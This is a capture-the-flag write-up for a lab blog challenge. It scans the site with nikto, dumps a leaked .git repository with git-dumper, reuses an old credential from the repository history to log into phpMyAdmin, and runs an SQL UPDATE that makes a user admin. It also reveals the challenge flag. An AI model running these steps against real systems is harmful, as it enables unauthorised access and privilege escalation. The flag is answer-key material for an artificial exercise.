#### Challenge:

Hi, packet inspector,

a simple blog webpage was created where all employees can write their suggestions for improvements. It is one part of the optimization plan designed by our allmighty AI.

Examine the web [http://blog.mysterious-delivery.tcc:20000/
](http://blog.mysterious-delivery.tcc:20000/) and find any interesting information.

May the Packet be with you!

---

#### Solution:

- playing with `nikto` reveals couple of interesting things:
  - actual `git` repository of the service is leaked
  - `phpmyadmin` web `UI` is accessible

```bash
nikto -h http://blog.mysterious-delivery.tcc:20000/
git-dumper http://blog.mysterious-delivery.tcc:20000/.git/ ~/blog 
```

- poking around in the repository history reveals that multiple usernames and passwords have been used in past, playing with this one of the combination works `attendance:56843437e5c747a2c9c08e4b79f109c3` and we have access to DB
- then altering the role via web `SQL` client for specific user and we can access the flag end point `/settings`

```sql
use attendance 
update user set role = "admin" where id = 136 
```

---

<details><summary>FLAG:</summary>

```
FLAG{gDfv-5zlU-spVN-D4Qb}
```

</details>
<br/>
